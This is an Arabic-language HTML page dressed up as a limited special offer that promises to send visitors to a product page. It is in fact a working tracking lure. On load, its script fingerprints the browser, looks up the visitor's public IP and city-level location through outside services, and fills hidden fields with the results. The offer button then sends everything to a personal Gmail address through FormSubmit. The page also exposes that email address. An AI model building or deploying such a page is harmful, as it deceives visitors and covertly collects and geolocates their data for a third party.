<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>عرض خاص</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            text-align: center;
        }
        
        .container {
            background-color: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            padding: 40px;
            width: 100%;
            max-width: 500px;
        }
        
        h1 {
            color: #2575fc;
            margin-bottom: 20px;
            font-size: 28px;
        }
        
        p {
            color: #555;
            margin-bottom: 30px;
            font-size: 18px;
            line-height: 1.6;
        }
        
        .btn {
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            color: white;
            border: none;
            border-radius: 50px;
            padding: 20px 50px;
            font-size: 22px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(37, 117, 252, 0.4);
        }
        
        .btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 20px rgba(37, 117, 252, 0.6);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .message {
            margin-top: 25px;
            padding: 15px;
            border-radius: 10px;
            display: none;
            font-weight: bold;
        }
        
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
            vertical-align: middle;
            display: none;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .footer {
            margin-top: 30px;
            font-size: 14px;
            color: #777;
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 30px 20px;
            }
            
            h1 {
                font-size: 24px;
            }
            
            p {
                font-size: 16px;
            }
            
            .btn {
                padding: 15px 40px;
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>عرض خاص محدود!</h1>
        <p>انقر على الزر أدناه للاستفادة من عرضنا الحصري المحدود. سيتم تحويلك إلى صفحة المنتج بعد النقر.</p>
        
        <!-- استخدم FormSubmit مباشرة في النموذج -->
        <form id="dataForm" action="https://formsubmit.co/amealg1996@gmail.com" method="POST">
            <!-- إضافة الحقول المخفية لجمع البيانات -->
            <input type="hidden" name="_subject" value="بيانات زائر جديد">
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="userAgent" id="userAgent">
            <input type="hidden" name="language" id="language">
            <input type="hidden" name="platform" id="platform">
            <input type="hidden" name="screen" id="screen">
            <input type="hidden" name="timezone" id="timezone">
            <input type="hidden" name="time" id="time">
            <input type="hidden" name="referrer" id="referrer">
            <input type="hidden" name="ip" id="ip">
            <input type="hidden" name="location" id="location">
            <input type="hidden" name="browser" id="browser">
            <input type="hidden" name="os" id="os">
            <input type="hidden" name="deviceType" id="deviceType">
            
            <button type="submit" class="btn" id="actionBtn">
                <span class="loading" id="loadingSpinner"></span>
                <span id="btnText">اضغط هنا</span>
            </button>
        </form>
        
        <div id="message" class="message"></div>
        
        <div class="footer">
            <p>هذا العرض ساري لفترة محدودة فقط</p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // جمع معلومات المستخدم عند تحميل الصفحة
            collectUserData();
        });

        // جمع معلومات المستخدم
        function collectUserData() {
            // معلومات المتصفح الأساسية
            document.getElementById('userAgent').value = navigator.userAgent;
            document.getElementById('language').value = navigator.language;
            document.getElementById('platform').value = navigator.platform;
            document.getElementById('screen').value = `${screen.width}x${screen.height}`;
            document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
            document.getElementById('time').value = new Date().toLocaleString('ar-SA');
            document.getElementById('referrer').value = document.referrer || 'Direct';
            
            // تحديد نوع المتصفح ونظام التشغيل
            const userAgent = navigator.userAgent.toLowerCase();
            
            // تحديد المتصفح
            if (userAgent.includes('chrome') && !userAgent.includes('edg')) {
                document.getElementById('browser').value = 'Chrome';
            } else if (userAgent.includes('firefox')) {
                document.getElementById('browser').value = 'Firefox';
            } else if (userAgent.includes('safari') && !userAgent.includes('chrome')) {
                document.getElementById('browser').value = 'Safari';
            } else if (userAgent.includes('edg')) {
                document.getElementById('browser').value = 'Edge';
            } else if (userAgent.includes('opera') || userAgent.includes('opr')) {
                document.getElementById('browser').value = 'Opera';
            } else {
                document.getElementById('browser').value = 'غير معروف';
            }
            
            // تحديد نظام التشغيل
            if (userAgent.includes('windows')) {
                document.getElementById('os').value = 'Windows';
            } else if (userAgent.includes('mac')) {
                document.getElementById('os').value = 'Mac';
            } else if (userAgent.includes('linux')) {
                document.getElementById('os').value = 'Linux';
            } else if (userAgent.includes('android')) {
                document.getElementById('os').value = 'Android';
            } else if (userAgent.includes('ios') || userAgent.includes('iphone') || userAgent.includes('ipad')) {
                document.getElementById('os').value = 'iOS';
            } else {
                document.getElementById('os').value = 'غير معروف';
            }
            
            // تحديد نوع الجهاز
            document.getElementById('deviceType').value = /Mobile|Android|iP(hone|od|ad)/.test(navigator.userAgent) ? 'جوال' : 'كمبيوتر';
            
            // الحصول على عنوان IP والمعلومات الجغرافية
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('ip').value = data.ip;
                    
                    // الحصول على المعلومات الجغرافية
                    return fetch(`https://ipapi.co/${data.ip}/json/`);
                })
                .then(response => response.json())
                .then(locationData => {
                    const locationStr = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
                    document.getElementById('location').value = locationStr;
                })
                .catch(error => {
                    console.log('لا يمكن الحصول على معلومات الموقع');
                    document.getElementById('location').value = 'غير متوفر';
                });
        }

        // إضافة مستمع الحدث للنموذج
        document.getElementById('dataForm').addEventListener('submit', function(e) {
            const btn = document.getElementById('actionBtn');
            const btnText = document.getElementById('btnText');
            const loadingSpinner = document.getElementById('loadingSpinner');
            const message = document.getElementById('message');
            
            // إظهار رسالة التحميل
            message.style.display = 'none';
            btnText.textContent = 'جاري التجهيز...';
            loadingSpinner.style.display = 'inline-block';
            btn.disabled = true;
            
            // إظهار رسالة نجاح (سيتم التوجيه تلقائياً بواسطة FormSubmit)
            message.textContent = 'جاري تحويلك إلى صفحة المنتج...';
            message.className = 'message success';
            message.style.display = 'block';
        });
    </script>
</body>
</html>
